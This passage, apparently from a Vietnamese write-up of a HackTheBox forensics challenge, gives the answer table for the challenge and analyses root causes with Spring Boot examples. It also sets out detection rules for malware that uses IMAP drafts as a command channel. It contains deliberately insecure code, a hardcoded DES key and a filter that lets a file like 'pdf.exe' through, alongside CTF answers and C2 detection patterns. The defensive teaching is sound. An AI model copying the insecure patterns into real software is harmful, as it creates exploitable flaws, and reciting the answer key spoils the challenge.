+  <tr><td>1</td><td>Subject phishing email</td><td><code>Updated Instructions for VPN Connection – Please Read and Apply</code></td><td><code>&lt;title&gt;</code> của preview uid=1</td><td>Chuỗi xuất hiện nguyên văn trong HTML response</td></tr>
+  <tr><td>2</td><td>Số recipients</td><td><code>43</code></td><td>To: 10 hiển thị + “33 more”; không có Cc</td><td>44 mailto unique − 1 From = 43 (đối chiếu chéo)</td></tr>
+  <tr><td>3</td><td>Email nạn nhân</td><td><code>finance.branch8@sentinel.net</code></td><td><code>"username"</code> trong session webmail mở uid=1 + tải _part=2</td><td>Cùng response chứa attachment <code>VPN_LDAP_user_guide.pdf.exe</code></td></tr>
+  <tr><td>4</td><td>MD5 malware</td><td><code>d1417810f33cb609ef7933c5f48ebb0c</code></td><td>HTTP object <code>_part=2&amp;_download=1</code></td><td><code>file</code> nhận diện PE32 .NET, 11 264 byte</td></tr>
+  <tr><td>5</td><td>Method capture desktop</td><td><code>CopyFromScreen</code> (PowerShell)</td><td>Body draft giải mã ở 3.5</td><td>Ảnh PNG thu được đúng pipeline của lệnh</td></tr>
+  <tr><td>6</td><td>Title leaked contract</td><td><code>LOAN AND SECURITY AGREEMENT</code> (<code>Agreement_TechSepa.docx</code>)</td><td>Screenshot cuối (APPEND {217989})</td><td>Heading trong ảnh + title bar Word</td></tr>
+</table>
+
+<h2 id="p5">Phần 5 — Root cause qua góc nhìn kỹ sư Java/Spring Boot</h2>
+<p>Đây là challenge forensics nên Phần 5 phân tích <b>nguyên tắc thiết kế bị vi phạm</b> — mỗi lỗi đi kèm ví dụ code Spring Boot tương đồng.</p>
+
+<h3>Lỗi 1 — Khoá mã hoá cứng trong binary (hardcoded key)</h3>
+<div class="spring bad-ex">
+  <div class="hd">❌ Kiểu viết đem lại thảm hoạ</div>
+  <div class="bd"><pre><span class="kw">private static final</span> String <span class="st">SECRET_KEY</span> = <span class="st">"w3BrhP&gt;2"</span>;  <span class="cm">// nằm ngay trong binary → strings là lộ</span>
+<span class="kw">public byte</span>[] encrypt(<span class="kw">byte</span>[] data) {
+    Cipher c = Cipher.<span class="fn">getInstance</span>(<span class="st">"DES/CBC/PKCS5Padding"</span>);
+    c.<span class="fn">init</span>(Cipher.ENCRYPT_MODE, <span class="kw">new</span> SecretKeySpec(SECRET_KEY.getBytes(), <span class="st">"DES"</span>));
+    <span class="kw">return</span> c.<span class="fn">doFinal</span>(data);
+}</pre></div>
+</div>
+<div class="spring">
+  <div class="hd">✅ Nguyên tắc: khoá phải lấy từ nơi ngoài binary, thuật toán không lỗi thời</div>
+  <div class="bd"><pre><span class="cm">// Khoá trong Vault/KMS, rotate định kỳ; dùng AES-GCM thay DES</span>
+Cipher c = Cipher.<span class="fn">getInstance</span>(<span class="st">"AES/GCM/NoPadding"</span>);
+c.<span class="fn">init</span>(Cipher.ENCRYPT_MODE, keyFromKms(), gcmSpec);
+<span class="cm">// Và phía Blue team: giả định mọi malware đều dùng thuật toán yếu có thể phá —</span>
+<span class="cm"># đây chính là lý do forensics CTF này cho phép ta đọc toàn bộ C2</span></pre></div>
+</div>
+
+<h3>Lỗi 2 — Hệ thống email không chặn double extension</h3>
+<div class="spring bad-ex">
+  <div class="hd">❌ Gateway chỉ check Content-Type, không check tên file thực</div>
+  <div class="bd"><pre><span class="cm">// Filter kiểu “đủ điều kiện” — chỉ nhìn đuôi cuối</span>
+<span class="kw">if</span> (filename.endsWith(<span class="st">".pdf"</span>)) { allow(); }   <span class="cm">// "…pdf.exe" vẫn qua</span></pre></div>
+</div>
+<div class="spring">
+  <div class="hd">✅ Chặn theo magic bytes + cảnh báo double extension</div>
+  <div class="bd"><pre><span class="cm">// So %PDF- thật trong 4 byte đầu, và reject mọi tên có ≥2 extension thực</span>
+<span class="kw">boolean</span> isPdf = attachment.<span class="fn">magic</span>().equals(<span class="st">"%PDF"</span>);
+<span class="kw">boolean</span> dualExt = filename.split(<span class="st">"\\."</span>).length &gt; 2;
+<span class="kw">if</span> (dualExt || !isPdf) { <span class="fn">quarantine</span>(); }</pre></div>
+</div>
+
+<h3>Lỗi 3 — C2 ngụy trang trong dịch vụ hợp lệ (IMAP draft)</h3>
+<div class="spring">
+  <div class="bd"><pre><span class="cm">// Blue team tương đồng: không chỉ log HTTP — hãy log và phân tích cả "người dùng bất thường"</span>
+<span class="cm">// Một tiến trình desktop đăng nhập IMAP mỗi 60s, SEARCH draft theo subject base64,</span>
+<span class="cm">// rồi APPEND report — là behavior anomaly dễ phát hiện nếu log IMAP được đưa vào SIEM:</span>
+<span class="cm"># alert: imap.command == APPEND &amp;&amp; subject matches "^a___.*_report_"</span>
+<span class="cm"># alert: desktop-ip → tcp/143 ngoài giờ làm việc, định kỳ 60s</span></pre></div>
+</div>
+<p>Người gửi 43 recipient cùng lúc với attachment exe nén trong .pdf cũng là tín hiệu spam mà mail gateway tốt sẽ chặn (SPF/DKIM fail + bulk BCC pattern).</p>
+
+<h2 id="p6">Phần 6 — Bài học &amp; checklist khi tự làm lại</h2>
+<div class="card">
+<ol class="steps">
+  <li><b>Mở bằng thống kê, không mở bằng cảm tính:</b> <code>io,phs</code> trong 30 giây chỉ cho ta 4 đường đào (HTTP/IMAP/DNS/NBNS) thay vì lần mò 10 217 frame.</li>
+  <li><b>“Log” không có nghĩa là đã sạch:</b> công cụ export lỗi (imf_export) vẫn giữ nguyên blob DES — artifact lỗi của tool đôi khi là evidence tốt nhất.</li>
+  <li><b>Đọc metadata trước khi đoán thuật toán:</b> 20 phút thử AES/RC4 mò mẫm (Phần 2.4) thua 2 phút <code>strings UTF-16</code> trên binary .NET.</li>
+  <li><b>Giao thức “hiền lành” có thể là C2:</b> IMAP draft poll là kỹ thuật chống firewall; chữ ký nhận diện: SEARCH theo subject base64 → FETCH draft → APPEND report, đều đặn theo phút.</li>
+  <li><b>Reassemble IMAP literal thủ công:</b> nhớ xoá <code>\r\n+ OK\r\n</code> chen giữa và cắt base64 về bội 4 khi capture drop gói cuối.</li>
+  <li><b>Payload bọc 2 lớp không đồng nhất:</b> cùng một hàm mã hoá nhưng sau DES có thể là base64(text) hoặc text thuần — kiểm chứng bằng magic bytes (PNG = <code>iVBORw0K</code>, PE = <code>MZ</code>).</li>
+  <li><b>Checklist tự làm lại:</b> ① io,phs → ② imap.request (mẫu C2) → ③ http.request (login/preview/download) → ④ export-objects http → ⑤ strings UTF-16 binary → ⑥ DES-CBC(iv=8B đầu, key từ strings) → ⑦ giải mã report lớn nhất → ⑧ đọc ảnh.</li>
+</ol>
+</div>
+
+<p class="muted" style="margin-top:40px">Bộ đáp án 6 câu đã trích hoàn chỉnh từ <code>capture.pcapng</code> nhưng <b>chưa nộp</b> — bạn tự submit từng câu trên portal HTB. Chúc mừng! 🎉</p>
+
+</div>
+</body>
+</html>
